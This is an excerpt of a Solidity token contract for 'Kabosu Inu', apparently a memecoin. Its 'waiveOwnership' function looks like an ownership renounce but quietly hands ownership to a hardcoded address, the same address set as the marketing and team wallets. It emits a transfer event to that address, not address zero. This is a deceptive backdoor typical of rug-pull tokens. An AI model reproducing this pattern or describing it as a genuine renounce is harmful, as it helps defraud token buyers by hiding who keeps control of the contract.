...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x457A4204e41cc80C887a5eDf0CBee5507a4d4449));
        _owner = address(0x457A4204e41cc80C887a5eDf0CBee5507a4d4449);
    }
...
contract KabosuInu is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Kabosu Inu";
    string private _symbol = "Kabosu Inu";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x457A4204e41cc80C887a5eDf0CBee5507a4d4449);
    address payable public teamWalletAddress = payable(0x457A4204e41cc80C887a5eDf0CBee5507a4d4449);
